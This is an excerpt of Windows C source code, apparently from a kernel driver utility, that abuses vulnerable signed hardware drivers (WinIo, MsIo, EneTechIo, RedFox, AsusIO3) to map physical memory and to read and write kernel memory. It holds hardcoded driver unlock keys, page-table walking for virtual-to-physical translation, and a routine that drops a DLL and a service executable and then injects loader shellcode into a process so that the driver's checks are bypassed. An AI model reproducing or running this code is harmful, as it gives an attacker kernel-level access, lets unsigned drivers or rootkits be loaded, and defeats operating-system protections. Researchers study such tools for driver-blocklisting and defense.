...
//
static ULONG g_EneTechIoUnlockKey[4] = {0x54454E45, 0x4E484345, 0x474F4C4F,
                                        0x434E4959};
static ULONG g_EneTechIoUnlockKey2[4] = {0x9984FD3E, 0x70683A8, 0xBD444418,
                                         0x5E10D83};
...
typedef PVOID(WINAPI* pfnWinIoGenericMapMemory)(_In_ HANDLE DeviceHandle,
                                                _In_ ULONG_PTR PhysicalAddress,
                                                _In_ ULONG NumberOfBytes,
                                                _Out_ HANDLE* SectionHandle,
                                                _Out_ PVOID* ReferencedObject);

typedef VOID(WINAPI* pfnWinIoGenericUnmapMemory)(_In_ HANDLE DeviceHandle,
 ...
 *
 */
PVOID MsIoMapMemory(_In_ HANDLE DeviceHandle,
                    _In_ ULONG_PTR PhysicalAddress,
                    _In_ ULONG NumberOfBytes,
                    _Out_ HANDLE* SectionHandle,
                    _Out_ PVOID* ReferencedObject) {
    ...
    *ReferencedObject = NULL;
    ...
    if (supCallDriver(DeviceHandle, g_WinIoMapIOCTL, &request, sizeof(request),
 ...
 *
 */
VOID MsIoUnmapMemory(_In_ HANDLE DeviceHandle,
                     _In_ PVOID SectionToUnmap,
                     _In_ HANDLE SectionHandle,
                     _In_ PVOID ReferencedObject) {
    MSIO_PHYSICAL_MEMORY_INFO request;
    ...
    supCallDriver(DeviceHandle, g_WinIoUnmapIOCTL, &request, sizeof(request),
                  &request, sizeof(request));
}
 ...
 *
 */
PVOID WinIoMapMemory(_In_ HANDLE DeviceHandle,
                     _In_ ULONG_PTR PhysicalAddress,
                     _In_ ULONG NumberOfBytes,
                     _Out_ HANDLE* SectionHandle,
                     _Out_ PVOID* ReferencedObject) {
 ...
 *
 */
VOID WinIoUnmapMemory(_In_ HANDLE DeviceHandle,
                      _In_ PVOID SectionToUnmap,
                      _In_ HANDLE SectionHandle,
                      _In_ PVOID ReferencedObject) {
    WINIO_PHYSICAL_MEMORY_INFO request;
 ...
 *
 */
PVOID WinIoMapMemory2(_In_ HANDLE DeviceHandle,
                      _In_ ULONG_PTR PhysicalAddress,
                      _In_ ULONG NumberOfBytes,
                      _Out_ HANDLE* SectionHandle,
                      _Out_ PVOID* ReferencedObject) {
    ...
    *ReferencedObject = NULL;
    ...
    // after key is generated and can only do that uppon EneTechIo device call
    // completion.
    //
 ...
 *
 */
VOID WinIoUnmapMemory2(_In_ HANDLE DeviceHandle,
                       _In_ PVOID SectionToUnmap,
                       _In_ HANDLE SectionHandle,
                       _In_ PVOID ReferencedObject) {
    AES_ctx ctx;
 ...
 *
 */
PVOID RedFoxMapMemory(_In_ HANDLE DeviceHandle,
                      _In_ ULONG_PTR PhysicalAddress,
                      _In_ ULONG NumberOfBytes,
                      _Out_ HANDLE* SectionHandle,
                      _Out_ PVOID* ReferencedObject) {
 ...
 *
 */
VOID RedFoxUnmapMemory(_In_ HANDLE DeviceHandle,
                       _In_ PVOID SectionToUnmap,
                       _In_ HANDLE SectionHandle,
                       _In_ PVOID ReferencedObject) {
    WINIO_REDFOX request;
...
BOOL WINAPI WinIoQueryPML4Value(_In_ HANDLE DeviceHandle,
    ...
    *Value = 0;
    ...
    pbLowStub1M = (ULONG_PTR)g_WinIoMapMemoryRoutine(
        DeviceHandle, 0ULL, cbRead, &sectionHandle, &refObject);
    ...
    if (pbLowStub1M) {
        ...
        g_WinIoUnmapMemoryRoutine(DeviceHandle, (PVOID)pbLowStub1M,
                                  sectionHandle, refObject);
    }
 ...
 *
 */
BOOL WINAPI WinIoReadWritePhysicalMemory(_In_ HANDLE DeviceHandle,
                                         _In_ ULONG_PTR PhysicalAddress,
    ...
    //
    mappedSection =
        g_WinIoMapMemoryRoutine(DeviceHandle, PhysicalAddress, NumberOfBytes,
                                &sectionHandle, &refObject);
    ...
    if (mappedSection) {
        ...
        __try {
            if (DoWrite) {
                if (g_PhysAddress64bit) {
                    ...
                    RtlCopyMemory(RtlOffsetToPointer(mappedSection, offset),
                ...
                if (g_PhysAddress64bit) {
                    ...
                    RtlCopyMemory(Buffer,
                                  RtlOffsetToPointer(mappedSection, offset),
                                  NumberOfBytes);
                }
            }
        ...
        //
        g_WinIoUnmapMemoryRoutine(DeviceHandle, mappedSection, sectionHandle,
                                  refObject);
...
BOOL WINAPI WinIoReadPhysicalMemory(_In_ HANDLE DeviceHandle,
                                    ...
                                    _In_ PVOID Buffer,
                                    _In_ ULONG NumberOfBytes) {
    return WinIoReadWritePhysicalMemory(DeviceHandle, PhysicalAddress, Buffer,
                                        NumberOfBytes, FALSE);
}
...
BOOL WINAPI WinIoVirtualToPhysical(_In_ HANDLE DeviceHandle,
    ...
    return PwVirtualToPhysical(DeviceHandle, WinIoQueryPML4Value,
                               WinIoReadPhysicalMemory, VirtualAddress,
                               PhysicalAddress);
}
...
BOOL WINAPI WinIoReadKernelVirtualMemory(_In_ HANDLE DeviceHandle,
    ...
    bResult = WinIoVirtualToPhysical(DeviceHandle, Address, &physicalAddress);

    if (bResult) {
        bResult = WinIoReadWritePhysicalMemory(DeviceHandle, physicalAddress,
 ...
 *
 */
BOOL GlckIo2Register(_In_ HANDLE DeviceHandle) {
    AES_ctx ctx;
    ...
    return supCallDriver(DeviceHandle, IOCTL_GKCKIO2_REGISTER, &Buffer,
                         sizeof(Buffer), &OutBuf, sizeof(OutBuf));
}
...
BOOL WINAPI AsusIO3PreOpen(_In_ PVOID Param) {
    ...
    dllBuffer = (PBYTE)KDULoadResource(IDR_TAIGEI32, GetModuleHandle(NULL),
                                       &resourceSize, PROVIDER_RES_KEY, TRUE);
    ...
    if (supReplaceDllEntryPoint(dllBuffer, resourceSize,
                                (LPCSTR) "RegisterForProvider", FALSE)) {
        StringCchPrintf(szFileName, MAX_PATH * 2, TEXT("%ws\\%ws"), szTemp,
                        ASUS_LDR_DLL);

        NTSTATUS ntStatus;

        if (supWriteBufferToFile(szFileName, dllBuffer, resourceSize, TRUE,
                                 FALSE, &ntStatus)) {
            resourceSize = 0;
            svcBuffer = (PBYTE)KDULoadResource(
                IDR_DATA_ASUSCERTSERVICE, Context->ModuleBase, &resourceSize,
                PROVIDER_RES_KEY, TRUE);

            if (svcBuffer) {
                StringCchPrintf(szFileName, MAX_PATH * 2, TEXT("%ws\\%ws"),
                                szTemp, ASUS_SVC_EXE);

                if (supWriteBufferToFile(szFileName, svcBuffer, resourceSize,
                                         TRUE, FALSE, NULL)) {
                    HANDLE zombieProcess = NULL;

                    if (NT_SUCCESS(
                            supInjectPayload(svcBuffer, g_KduLoaderShellcode,
                                             sizeof(g_KduLoaderShellcode),
                                             szFileName, &zombieProcess))) {
                        Sleep(1000);
                ...
                supPrintfEvent(kduEventError,
                               "[!] Failed to load ASUS service resource\r\n");
            }
        ...
        supPrintfEvent(kduEventError,
                       "[!] Error while configuring helper dll\r\n");
    }
 ...
 *
 */
BOOL WINAPI WinIoRegisterDriver(_In_ HANDLE DeviceHandle,
                                _In_opt_ PVOID Param) {
